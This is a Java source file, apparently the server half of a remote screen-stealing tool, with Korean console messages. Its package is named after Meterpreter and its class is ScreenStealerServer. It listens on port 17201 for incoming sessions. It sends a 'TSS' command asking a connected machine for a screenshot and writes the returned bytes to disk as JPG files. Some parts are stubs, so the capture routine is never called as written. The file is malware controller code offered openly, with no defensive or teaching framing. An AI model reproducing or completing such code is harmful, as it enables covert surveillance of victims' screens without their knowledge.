package com.meterpreter;

import java.io.DataOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

abstract class pRes {

	public static List<Session> sessionList;

	public static ServerSocket serverSocket;
	public static final int LISTEN_PORT = 17201;
}

abstract class Cmd {

	public static final String TAKE_SCREEN_SHOT = "TSS";
}

class CaptureManager {

	private DataOutputStream dos;
	private ObjectInputStream ois;
	private String fileName;

	private static class Singleton {
		static CaptureManager INSTANCE = new CaptureManager();
	}

	public static CaptureManager getInstance() {
		return Singleton.INSTANCE;
	}

	public void capture(DataOutputStream dos, ObjectInputStream ois) {
		setStream(dos, ois);

		if (!sendCommand(Cmd.TAKE_SCREEN_SHOT))
			return;

		byte[] screenCaptureByteArray = getScreenCaptureByteArray();
		if (screenCaptureByteArray == null)
			return;

		update(screenCaptureByteArray);
	}

	private void setStream(DataOutputStream dos, ObjectInputStream ois) {
		this.dos = dos;
		this.ois = ois;
	}

	private boolean sendCommand(String cmd) {
		try {
			dos.writeUTF(cmd);
			return true;
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
	}

	private byte[] getScreenCaptureByteArray() {
		try {
			return (byte[]) ois.readObject();
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	private boolean update(byte[] captureImage) {
		try {
			String randomFileName = "" + System.currentTimeMillis() + ".jpg";
			FileOutputStream fos = new FileOutputStream(randomFileName);
			fos.write(captureImage);
			fos.close();

			System.out.println("사진을 저장했습니다.");
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
}

class Session implements Runnable {

	private String ip;
	private DataOutputStream dos;
	private ObjectInputStream ois;

	public Session(Socket sessionSocket) {
		if (!getStream(sessionSocket))
			return;
	}

	private boolean getStream(Socket sessionSocket) {
		try {
			dos = new DataOutputStream(sessionSocket.getOutputStream());
			ois = new ObjectInputStream(sessionSocket.getInputStream());
			ip = sessionSocket.getInetAddress().getHostAddress();
			System.out.println("새로운 세션 : IP : " + ip);

			return true;
		} catch (Exception e) {
			System.out.println("스트림을 얻는데 실패하였습니다.");
			return false;
		}
	}

	@Override
	public void run() {
		getIpAddress();
	}

	private void getIpAddress() {

	}

	private void waitForInterrupt() throws Exception {
		Thread.sleep(200);
	}
}

public class ScreenStealerServer {

	public void activate() {
		if (!initServer())
			return;

		acceptClient();
	}

	private boolean initServer() {
		try {
			pRes.serverSocket = new ServerSocket(pRes.LISTEN_PORT);
			pRes.sessionList = Collections.synchronizedList(new ArrayList<>());
			return true;
		} catch (IOException e) {
			System.out.println("포트가 이미 사용중입니다.");
			return false;
		}
	}

	private void acceptClient() {
		while (true) {
			try {
				Socket sessionSocket = pRes.serverSocket.accept();
				new Thread(new Session(sessionSocket)).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void main(String[] args) {
		ScreenStealerServer meterpreter = new ScreenStealerServer();
		meterpreter.activate();
	}
}